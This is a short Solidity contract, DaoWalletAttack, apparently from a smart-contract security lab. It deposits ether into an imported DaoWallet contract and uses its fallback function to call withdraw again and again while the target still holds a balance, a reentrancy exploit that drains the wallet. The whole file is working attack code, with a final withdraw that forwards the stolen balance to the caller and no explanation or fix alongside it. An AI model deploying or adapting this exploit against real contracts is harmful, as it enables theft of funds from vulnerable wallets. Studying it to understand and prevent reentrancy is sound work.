// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.10;

import './DaoWallet.sol';

contract DaoWalletAttack{

    DaoWallet public daoWallet;

    constructor(address _addr) public {
        daoWallet = DaoWallet(_addr);
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        daoWallet.deposit{value: msg.value}();
        daoWallet.withdraw(1 ether);
    }

    fallback() external payable{
        if(address(daoWallet).balance >= 1){
            daoWallet.withdraw(1 ether);
        }
    }

    function getContractBalance() public view returns (uint){
        return address(this).balance;
    }

    function withdraw() public {
        address(msg.sender).call{value: address(this).balance}("");
    }
}